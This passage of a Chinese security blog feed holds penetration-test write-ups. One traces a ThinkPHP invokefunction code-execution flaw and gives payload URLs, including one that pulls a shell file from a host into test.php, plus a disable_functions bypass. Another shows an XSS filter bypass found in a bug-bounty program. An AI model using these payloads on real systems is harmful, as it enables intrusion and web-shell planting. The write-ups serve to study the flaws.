title="0x03 GetShell"></a>0x03 GetShell</h1><p>俗话说，三个臭皮匠顶一个诸葛亮，求助师傅们后，给出了解决的办法</p><ol><li>Noel 师傅的解决方法及分析：</li></ol><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/5.png"></p><p>Request.php的filtervalue函数下存在call_user_func,根据Payload，跟踪下流程</p><p>首先会进入App.php的Run方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params">Request $request = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        ………………………………</span><br><span class="line">        <span class="comment">// 未设置调度信息则进行 URL 路由检测</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">empty</span>($dispatch)) &#123;</span><br><span class="line">            <span class="comment">/*执行当前类的routeCheck方法,获取调度信息,如访问index模块下index控制器里的index方法,则</span></span><br><span class="line"><span class="comment">                $dispatch = array(2) &#123; [&quot;type&quot;]=&gt; string(6) &quot;module&quot;</span></span><br><span class="line"><span class="comment">                    [&quot;module&quot;]=&gt; array(3) &#123;</span></span><br><span class="line"><span class="comment">                        [0]=&gt; string(5) &quot;index&quot; [1]=&gt; string(5) &quot;index&quot; [2]=&gt; string(5) &quot;index&quot; &#125; &#125;</span></span><br><span class="line"><span class="comment">                */</span></span><br><span class="line">            $dispatch = <span class="built_in">self</span>::routeCheck($request, $config);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录当前调度信息 将获取的调度信息,即模块,控制器,方法名存入Request类的dispatch属性中</span></span><br><span class="line">        $request-&gt;dispatch($dispatch);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 记录路由和请求信息 调式模式,在\application\config.php 参数app_debug可配置</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">self</span>::$debug) &#123;</span><br><span class="line">            Log::record(<span class="string">&#x27;[ ROUTE ] &#x27;</span> . var_export($dispatch, <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">            Log::record(<span class="string">&#x27;[ HEADER ] &#x27;</span> . var_export($request-&gt;header(), <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">            Log::record(<span class="string">&#x27;[ PARAM ] &#x27;</span> . var_export($request-&gt;param(), <span class="literal">true</span>), <span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ………………………………</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我们主要关注routeCheck和param两个函数，先看routeCheck</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">routeCheck</span>(<span class="params">$request, <span class="keyword">array</span> $config</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $path   = $request-&gt;path();</span><br><span class="line">        $depr   = $config[<span class="string">&#x27;pathinfo_depr&#x27;</span>];</span><br><span class="line">        $result = <span class="literal">false</span>;</span><br><span class="line">      ………………………………</span><br><span class="line">        <span class="comment">// 路由检测（根据路由定义返回不同的URL调度）</span></span><br><span class="line">        $result = Route::check($request, $path, $depr, $config[<span class="string">&#x27;url_domain_deploy&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>主要是将请求参数什么的传入，经过check后就基本上都处理好了</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/6.png"></p><p>在调试模式开启的情况下可以进入param函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;param)) &#123;</span><br><span class="line">            $method = <span class="keyword">$this</span>-&gt;method(<span class="literal">true</span>);</span><br><span class="line">    ......</span><br><span class="line">        <span class="keyword">$this</span>-&gt;param = array_merge(<span class="keyword">$this</span>-&gt;get(<span class="literal">false</span>), $vars, <span class="keyword">$this</span>-&gt;route(<span class="literal">false</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">$this</span>-&gt;input(<span class="keyword">$this</span>-&gt;param, $name, $default, $filter);</span><br><span class="line">    </span><br></pre></td></tr></table></figure><p> 跟进input函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">input</span>(<span class="params">$data = [], $name = <span class="string">&#x27;&#x27;</span>, $default = <span class="literal">null</span>, $filter = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line">      $filter = <span class="keyword">$this</span>-&gt;getFilter($filter, $default);</span><br><span class="line">      <span class="keyword">if</span> (is_array($data)) &#123;</span><br><span class="line">          array_walk_recursive($data, [<span class="keyword">$this</span>, <span class="string">&#x27;filterValue&#x27;</span>], $filter);</span><br><span class="line">          reset($data);</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;filterValue($data, $name, $filter);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><p>getFilter取出filter的值，在这里也就是assert</p><p>array_walk_recursive</p><blockquote><p>array_walk_recursive() 函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数。该函数与 <a href="https://www.runoob.com/php/func-array-walk.html">array_walk()</a> 函数的不同在于可以操作更深的数组（一个数组中包含另一个数组）。</p></blockquote><p>及对$data的每一个元素应用filterValue函数，跟进filterValue</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filterValue</span>(<span class="params">&amp;$value, $key, $filters</span>)</span>&#123;</span><br><span class="line"> ......   </span><br><span class="line"><span class="keyword">if</span> (is_callable($filter)) &#123;</span><br><span class="line">                <span class="comment">// 调用函数或者方法过滤</span></span><br><span class="line">                $value = call_user_func($filter, $value);</span><br><span class="line">            &#125;</span><br><span class="line">......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>铳梦师傅的解决方法及分析：</li></ol><p>payload参考：</p><p>来自：<a href="https://xz.aliyun.com/t/3570#toc-4">https://xz.aliyun.com/t/3570#toc-4</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;index.php?s&#x3D;index&#x2F;think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;assert&amp;vars[1][]&#x3D;phpinfo()</span><br></pre></td></tr></table></figure><p>执行phpinfo（这里注意看 ?s= 后的参数）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;127.0.0.1&#x2F;?s&#x3D;..&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;assert&amp;vars[1][]&#x3D;phpinfo()</span><br></pre></td></tr></table></figure><p>拿shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;127.0.0.1&#x2F;?s&#x3D;..&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;assert&amp;vars[1][]&#x3D;copy(&#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;shell.txt&#39;,&#39;test.php&#39;)</span><br></pre></td></tr></table></figure><p>为什么要这么构造呢，给出当前的目录情况以及分析：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/7.png"></p><p>Route.php的parseUrl函数会对url进行处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrl</span>(<span class="params">$url, $depr = <span class="string">&#x27;/&#x27;</span>, $autoSearch = <span class="literal">false</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        .......</span><br><span class="line">        $url              = str_replace($depr, <span class="string">&#x27;|&#x27;</span>, $url);</span><br><span class="line">        <span class="keyword">list</span>($path, $var) = <span class="built_in">self</span>::parseUrlPath($url);</span><br><span class="line">    ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>首先将url中的<code>/</code>替换为<code>|</code>之后是parseUrlPath将url分割</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseUrlPath</span>(<span class="params">$url</span>)</span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">     <span class="comment">// 分隔符替换 确保路由定义使用统一的分隔符</span></span><br><span class="line">     $url = str_replace(<span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, $url);</span><br><span class="line">     $url = trim($url, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">     $var = [];</span><br><span class="line">     <span class="keyword">if</span> (<span class="literal">false</span> !== strpos($url, <span class="string">&#x27;?&#x27;</span>)) &#123;</span><br><span class="line">......</span><br><span class="line">         ......</span><br><span class="line">     &#125; <span class="keyword">elseif</span> (strpos($url, <span class="string">&#x27;/&#x27;</span>)) &#123;</span><br><span class="line">         <span class="comment">// [模块/控制器/操作]</span></span><br><span class="line">         $path = explode(<span class="string">&#x27;/&#x27;</span>, $url);</span><br><span class="line">     &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">         ......</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">return</span> [$path, $var];</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>得到如下三部分</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/8.png"></p><p>模块加载时Loder.php下的parseName函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">parseName</span>(<span class="params">$name, $type = <span class="number">0</span>, $ucfirst = <span class="literal">true</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ($type) &#123;</span><br><span class="line">        $name = preg_replace_callback(<span class="string">&#x27;/_([a-zA-Z])/&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$match</span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> strtoupper($match[<span class="number">1</span>]);</span><br><span class="line">        &#125;, $name);</span><br><span class="line">        <span class="keyword">return</span> $ucfirst ? ucfirst($name) : lcfirst($name);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> strtolower(trim(preg_replace(<span class="string">&quot;/[A-Z]/&quot;</span>, <span class="string">&quot;_\\0&quot;</span>, $name), <span class="string">&quot;_&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/9.png"></p><p>现在就会实例化\Think\app类并执行invokefunction方法</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/10.png"></p><p>所以加<code>../\</code>的原因是可以再往前跳一层</p><h1 id="0x04-bypass-disable-functions"><a href="#0x04-bypass-disable-functions" class="headerlink" title="0x04 bypass disable_functions"></a>0x04 bypass disable_functions</h1><p>查看禁用</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/11.png"></p><ol><li><p>一开始没仔细看禁用的内容，直接就用了这个</p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a> </p></li></ol><p>但是发现putenv被禁用了</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/12.png"></p><ol start="2"><li>换个方法，通过这篇文章</li></ol><p><a href="https://mochazz.github.io/2018/09/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E7%BB%95%E8%BF%87PHP%E7%9A%84disable_functions/">https://mochazz.github.io/2018/09/27/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E7%BB%95%E8%BF%87PHP%E7%9A%84disable_functions/</a></p><p>了解到利用pcntl扩展，确认系统支持</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/13.png"></p><p>最终成功执行命令</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.14/14.png"></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;文章首发无法溯源安全团队公众号&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="PHP" scheme="https://www.se7ensec.cn/tags/PHP/"/>
    
    <category term="GetShell" scheme="https://www.se7ensec.cn/tags/GetShell/"/>
    
  </entry>
  
  <entry>
    <title>某某街一处XSS的绕过思路</title>
    <link href="https://www.se7ensec.cn/2020/02/06/%E6%9F%90%E6%9F%90%E8%A1%97%E4%B8%80%E5%A4%84XSS%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/"/>
    <id>https://www.se7ensec.cn/2020/02/06/%E6%9F%90%E6%9F%90%E8%A1%97%E4%B8%80%E5%A4%84XSS%E7%9A%84%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF/</id>
    <published>2020-02-06T15:10:24.000Z</published>
    <updated>2020-11-14T19:56:20.594Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>众测吃便便</p></blockquote><a id="more"></a><h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>疫情影响，过年放假呆在家里实在无聊，上去某平台看了下众测项目，想着挣点口罩钱</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.06/1.png"></p><h1 id="0x02-直接闭合"><a href="#0x02-直接闭合" class="headerlink" title="0x02 直接闭合"></a>0x02 直接闭合</h1><p>一开始尝试直接去闭合<code>&lt;a&gt;</code>标签，发现 <code>&quot;&gt; </code>输出时会被实体化编码，遂放弃</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.06/2.png"></p><h1 id="0x03-javascript-伪协议"><a href="#0x03-javascript-伪协议" class="headerlink" title="0x03 javascript 伪协议"></a>0x03 javascript 伪协议</h1><p>因为输出是在<code>&lt;a&gt;</code>标签的 <code>href</code> 里面，所以去尝试伪协议，payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:alert(document.domain) </span><br></pre></td></tr></table></figure><p>提交后发现，输出的内容直接过滤掉了 <code>javascript: </code></p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.06/3.png"></p><p>经过几次尝试，通过以下payload绕过了过滤，成功弹窗</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javas&amp;Tab;cript:alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.06/4.png"></p><p>不过一个小破弹窗怎么能证明危害</p><h1 id="0x04-绕过限制加载外部js"><a href="#0x04-绕过限制加载外部js" class="headerlink" title="0x04  绕过限制加载外部js"></a>0x04  绕过限制加载外部js</h1><p>直接用了xsshunter的payload，提交点击后，发现执行不能成功</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.06/5.png"></p><p>仔细对比下输出的内容和原始内容才发现，输出时所有的字符都强制转换小写了</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.06/6.png"></p><p>这里先了解下xss中的 <a href="https://www.cnblogs.com/milantgh/p/4246342.html">编码问题</a>，eval中支持Unicode编码，最终构造的payload把大写的字母单独编码下即可</p><p>最终效果：</p><p><img src="https://raw.githubusercontent.com/r00tSe7en/pictures/master/2020.02.06/7.png"></p><h1 id="0x05-报送结果"><a href="#0x05-报送结果" class="headerlink" title="0x05 报送结果"></a>0x05 报送结果</h1><p>本来以为好歹能混个中危，结果厂商认为这个点需要点击交互，给了低危。</p><p>申诉：评级的时候看下功能点，毕竟本来就是需要点击的业务功能。</p><p>厂商反馈：经过讨论，恶意链接为javascript开头利用难度较高，故维持评级低危。</p><h1 id="给👴爪巴"><a href="#给👴爪巴" class="headerlink" title="给👴爪巴"></a>给👴爪巴</h1>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;众测吃便便&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="渗透测试" scheme="https://www.se7ensec.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="XSS" scheme="https://www.se7ensec.cn/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>回炉再造</title>
    <link href="https://www.se7ensec.cn/2020/01/20/%E5%9B%9E%E7%82%89%E5%86%8D%E9%80%A0/"/>
    <id>https://www.se7ensec.cn/2020/01/20/%E5%9B%9E%E7%82%89%E5%86%8D%E9%80%A0/</id>
    <published>2020-01-20T07:15:15.000Z</published>
    <updated>2020-11-14T19:56:49.726Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>安全技术学习，承认自己的弱点不是丑事。<br>只有对原理了然于心，才能突破更多的限制。        ——@ringzero </p></blockquote><a id="more"></a><p>一二三四，二二三四，转个圈圈，再来一次。</p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;安全技术学习，承认自己的弱点不是丑事。&lt;br&gt;只有对原理了然于心，才能突破更多的限制。        ——@ringzero &lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="生活随笔" scheme="https://www.se7ensec.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="随想" scheme="https://www.se7ensec.cn/tags/%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>迟来的年度总结</title>
    <link href="https://www.se7ensec.cn/2020/01/09/%E8%BF%9F%E6%9D%A5%E7%9A%84%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/"/>
    <id>https://www.se7ensec.cn/2020/01/09/%E8%BF%9F%E6%9D%A5%E7%9A%84%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/</id>
    <published>2020-01-08T18:15:44.000Z</published>
    <updated>2020-11-18T14:16:48.986Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">Hey, password is required here.</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="78790b0fcbb582232e0fa60406638f705665b161aad31ea78faf0db676f27b32">1415c66757eec6f3f6373e1124982d58b3311bc876bcb0e0397e49af7fef20a7a6316d6b8cef3257b49f69802ec2a857daa3eca0da76f6b62b5ab2679256ece792b20a06af3bbbea36e5725f35a2308e07513261f90a47532744398b828434346c775e9ac1dd01e0d9c7c13dc7653078e0622624575379bc61adcd6065e3c4b0a1fdd15f5f721f822619e3af9f147ae340eebe44caa35da30fc223a73e9987e0739224e905345f831e81b7062ea7c21b3c07981e5f978dbab28250e08e408e3f989f70fba722e51e5d71dadd70e647eec0a3ea9a530eb97c72acdd2764ec514e46c5c599b57d7ecf9b799a012faed279c9db97e64ea2d0e1f5e38d3bd972ba1917cd3359aa4277645470cbd51adad2fe615a6752503309ba0d6b63bdd7b1dcf7a477a67b2fa448a1ed86ca41a225962b8be353d2733d55ed328d019f7d1b8bf23ef55f0a5908a055ad802d3be56865334382eaa6926b6536127a289cac566b6ddf6878d760ef170dbe199f990b28f199da21ae9650cdee194ac568c9ab6a72493b2d74e10c1b0416268c8e873d78a5293ef1f7dd7b394f1498ea6fb4647d5ec501035a3c2d012ae64c7e61cc3a1443427bf7650f92c45250dd800c2bddb3b248b211b351bbcd8ea901ba4a3caa43fd8fdc21514b066c3bb9d400391748e2ba3fde640589e7fe1bfd4574f1704b10b818c49e8b2ab5e5aba55fff1715ffc09674ca8a82749b6def8b3fbc37a13e99d72f0c14f2c22de339e1a11826e971314be6a77c527ae9a323b19af2adc1cb4f4ce669fd63488983c1ac0df9f52ea537b81e8f7de2e83eeeb89dda5802211767b9acf33342004ad9872b88dcdb711dae73ce4b60be19b83bddd09bd5469e1871870bdf2db4b1bc8b48f1e10006bf4e224eaab5a16372910e8d8702964ee1d9d2244d873d9d9c2b1ca3971a9712a97ba56d69b973514a269c5077ab5e8139fe38eb6c4452c8160b3b0d2660a7bd83cb4041ef61d646d85b66de148ad06f1812dd76db38f705c8d9730bc8a691532390925d8be62b835e3ae30740e258e8718701558d178d4d2506306e48f64f5144a55bd15439a7ce9f473ea3e2a3b4454b52ac8c394ccf094494882e324d4d799b94212f052929cc4804a42a5656389da12af6f7093fdb78405f900ba8ce6f93fd5128076fab66bcd2cb4584e54ee0c889bf94b0d6be27e7129c5df3786eff411bb1523b3e4a5d86c3714fa8df18b0e56b89e3b3070c566a1ef8e8f53fc3d443cf19ac6a33715df4366f68e4ccf116a3b237be7cdd4bf755b7b8816c79de6449349c331c3c3cb963d7eaad9e02865a1f1de2b098a57472a53dd3644a26a8202b538ce8614fe3029a6dfd9fb3550ac12aa148340bb60b8fd9f7c13d73dc292efb7034a712eba3656e3887e5c68ae910b0ddeec0ebe3d331b98a6187bcc66c9507c1a865665aa21e59e1e3d2a7e26fa021f52044ff1291c59db31295a913b7996cf7850ff1e79dcdbef8ff5739c445754510d7f16411d5981d0865a72a9655225153143895a5a97b1e8057a4c611397357c91e33592e1f662905f64ca055d96aa73396f4edadb902e06439a8779f4dc9b4864d903028ad63f03b5f95c872371dc52806c9ce38e297b800c2aa87513c3dee7a4659addc8810445044c96feef1af430743d40657bd3366966daa061f6463bc426253043c87a6f71396db43cbef1887513fb26e8176bf989ba0d9285a593dc829b324f516792a1c4380088126702277d8ed2daacc77bace51d7baa63d64a357f9a8c8da84cbfe6a17fd632aa4085263e8a09baa90ac8c69b1a3eb9251146fabe5bbd117c01103cf3ef73b4e4fd70a4341b206c96b526b3e9016d7ec29c29b5f94d5fbb32e32ce1d72449419811869bad52bd233e1f1d7fe0538dc05bbb6b422599aa2311bfa38f0e591beb4ac14c3ab1881bfd9d4cdceff8c83b93d1ceb7b323ffed4451b7826a4cb469b5146de6c0a79e3c7d88bdd8cae0c365fefcebf4018dd10b8419bb732654cf4e621efc745b9f2bab811a379c7fcc85b615b3667fcab6751b94e7385574ac723072d4546950d04b31b7c74128e1355e6cecbcd38b3354b735008482d3a94692ba8f8e6cc44b17d5e1099469963e2b7d712d775c8ba643b6b3b044712ecdb3cf54ef8260ba9b274d4dd6dd7dd3fc181ec533407b167584e50e8e82e6c7e29129f01e9faa0563b3ffb22a464833789636c7217a95e9c3267e9172e64ac2cfc84f6d945b7ed290766142943dbae4e0fd3d4b2615353772fa8f2b4f134f92ee8f3fc3b42a9343588e0429aeff078361669c7fe11e702bd9f6127cc41f81429f6f6318911b31267d76a6274c21a3f60bbdd91aab8105cdd7a64980819ff231d4f0dac3dbd5b85f5e3d678ac653628fb9c25d2e8a96d4d9373fa79e2ef1ccb32dcc300e2d0afe6e3898a4d0a5fe7c01ea2704df8a57efa19f09143b20db2ef69760a44079f75c2e75ee8b303d8a8e9e7353608d5e0b219b4912edd12a3a8cbf45854eebfc3199fe1d24be784643350802087f6843e4718ccefc0db3767a901acd69138bb7e93083c3916a601b911e1a40f4e81602388ac24ecc5f05e4997eb0fb6441df3c3712153bf29e062d602e970450425b90c5673ead4eb1be14d1a2991a79497cdb04e0b6dc1187b15c750574085df963a9c43923df4af35fe6372bd096aef8bc7ff7869eaa4ff603e35c6b0f239aee21cd57bb857daaadb0ac48a48daffa638afb7ca652352a7bb0c28c8409f82336aaa10dfa32ccd3a98b9c29ff45484389ade1559c2f21e667e81e331830e99cd906a1f9c6135c8c66fc72b18641bd365f6717a13f9f6a20a0b1dac041413320dff02453d5ecf9f089d31b68d6151d4f3e9a3ce33769f86891c39dd1af8e11ea0fad5fadf12045721d2bf1b5b5c63624e503f6c91cdabe3d0d49f5fbdcd29f848c97ba18ab2fa4f14eabd62dc23c3f10f633e941f9fb5303c1c9b83d5ba125a5624d9ab91ba5a9c7651cb5349dcbcca6f276c81467ba8af15463fd250646727186369e6c3b208f78aadcd5096feb2c1d5dc69586847850a80674a6f4cfc9cd4a296d9d2ba03936c0e351e598e4bcffd853d9ab5ca4fbd1afd561bb5dc0e18017e149a8cb910ad060f28e0bbe5389f187ff2c90f7f072c42ac04f93378f5d5e6c1a00855ef240a3be2701263a6c91416fda06b53eb51c826f4f03a26fa3ad96a6244f412d1c9d9b1df9fa50b10d3f5b475f0573ceabba3c694e10f7880423e512a8806d8e89f9b2dab22e70f2f222f4d52a8c57932488324712042e924</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="生活随笔" scheme="https://www.se7ensec.cn/categories/%E7%94%9F%E6%B4%BB%E9%9A%8F%E7%AC%94/"/>
    
    
    <category term="随想" scheme="https://www.se7ensec.cn/tags/%E9%9A%8F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>BC实战|后渗透之Bypass Applocker到提权</title>
    <link href="https://www.se7ensec.cn/2020/01/08/BC%E5%AE%9E%E6%88%98%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8BBypass%20Applocker%E5%88%B0%E6%8F%90%E6%9D%83/"/>
    <id>https://www.se7ensec.cn/2020/01/08/BC%E5%AE%9E%E6%88%98%E5%90%8E%E6%B8%97%E9%80%8F%E4%B9%8BBypass%20Applocker%E5%88%B0%E6%8F%90%E6%9D%83/</id>
    <published>2020-01-07T16:10:24.000Z</published>
    <updated>2020-11-14T19:57:04.506Z</updated>
    
